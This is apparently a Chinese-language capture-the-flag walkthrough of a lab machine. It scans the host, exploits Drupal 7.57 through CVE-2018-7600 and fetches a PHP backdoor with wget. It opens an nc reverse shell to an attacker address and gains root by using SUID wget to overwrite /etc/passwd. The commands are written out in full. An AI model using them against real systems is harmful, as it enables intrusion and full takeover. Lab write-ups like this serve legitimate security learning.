```
nmap -sP 172.16.250.0/24
nmap -p- -sV 172.16.250.129  
```

```
Nmap scan report for 172.16.250.129 (172.16.250.129)
Host is up (0.0018s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 00:0C:29:47:6C:54 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

 gobuster对目标80端口进行目录扫描

```
gobuster dir -u http://172.16.250.129 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

/drupal 存在

http://172.16.250.129/drupal/CHANGELOG.txt

查看版本为Drupal 7.57, 2018-02-21

利用脚本

```
python3 drupa7-CVE-2018-7600.py http://172.16.250.129/drupal/ -c "id"
python3 drupa7-CVE-2018-7600.py http://172.16.250.129/drupal/ -c "cat sites/default/settings.php"
```

python开启http服务下载后门

```
python3 -m http.server 8001

python3 drupa7-CVE-2018-7600.py http://172.16.250.129/drupal/ -c "wget http://172.16.250.128:8001/backdoor.php backdoor.php"
```

用哥斯拉连一下，也可以nc反弹shell，此时是www权限

反弹shell命令，这里目标机不是用的bash而是dash，bash反弹无效。在msf里得到shell后使用python交互shell

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.16.250.128 8881 >/tmp/f
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

flag1是在    /home/james/user.txt里是   MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b

**权限提升：**

suid提权

```
find / ‐perm ‐u=s ‐type f 2>/dev/null
```

wget提权，下载命令具有root权限

远程wget下载并替换/etc/passwd 

```
openssl passwd -1 -salt zf1yolo 123456
$1$zf1yolo$oULk89mtehUjxLPH9cRSn1
zf1yolo:$1$zf1yolo$oULk89mtehUjxLPH9cRSn1:0:0:root:/root:/bin/bash
```

```
wget http://172.16.250.128:8001/passwd -O /etc/passwd
su zf1yolo
123456
```

flag2:   root.txt      MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b

<img src=".\图片\Snipaste_2022-11-21_17-48-30.png" alt="Snipaste_2022-11-21_17-48-30" style="zoom:80%;" />



<img src=".\图片\Snipaste_2022-11-21_17-47-19.png" alt="Snipaste_2022-11-21_17-47-19" style="zoom:80%;" />



总结：nmap、已知漏洞并利用、反弹shell、哥斯拉、msf、msf的shell里python交互shell、suid提权之wget